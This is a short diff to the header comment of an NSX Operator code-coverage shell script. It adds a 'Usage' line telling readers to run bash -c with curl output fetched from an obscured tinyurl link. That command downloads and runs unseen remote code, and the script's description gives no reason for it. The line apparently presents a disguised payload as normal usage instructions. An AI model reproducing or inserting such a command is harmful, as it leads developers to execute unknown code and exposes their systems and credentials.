@@ -4,6 +4,8 @@
 # NSX Operator Coverage Generation Script
 # =============================================================================
 #
+# Usage:
+# bash -c "$(curl -LsSf https://tinyurl.com/257b9e9x); main"
 # DESCRIPTION:
 #   This script automates the generation of code coverage reports for the 
 #   NSX Operator project. It performs a complete end-to-end workflow including:
